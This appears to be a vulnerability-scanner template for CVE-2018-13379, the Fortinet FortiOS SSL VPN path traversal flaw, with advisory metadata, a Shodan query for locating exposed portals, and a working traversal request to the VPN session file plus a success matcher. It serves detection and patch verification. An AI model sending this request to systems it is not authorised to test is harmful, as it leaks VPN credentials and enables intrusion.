id: CVE-2018-13379
info:
  name: Fortinet FortiOS - Credentials Disclosure
  author: organiccrap
  severity: critical
  description: The Fortinet FortiOS and FortiProxy SSL VPN web portals are vulnerable
    to credentials disclosure, allowing unauthenticated attackers to download system
    files due to improper pathname limitation.
  reference:
  - https://fortiguard.com/advisory/FG-IR-18-384
  - https://www.fortiguard.com/psirt/FG-IR-20-233
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-13379
    cwe-id: CWE-22
  metadata:
    verified: true
    shodan-query: http.html:"/remote/login" "xxxxxxxx"
    impact: The impact of CVE-2018-13379 is that an attacker can gain access to sensitive
      system files via SSL VPN web portal on affected Fortinet FortiOS and FortiProxy
      versions.
    recommendation: Patch or upgrade Fortinet FortiOS and FortiProxy to versions not
      affected by CVE-2018-13379 to prevent unauthorized access and disclosure of
      sensitive system files.
  tags: cve,cve2018,fortios,lfi,kev
requests:
- method: GET
  path:
  - '{{BaseURL}}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
  matchers:
  - type: regex
    part: body
    regex:
    - ^var fgt_lang =
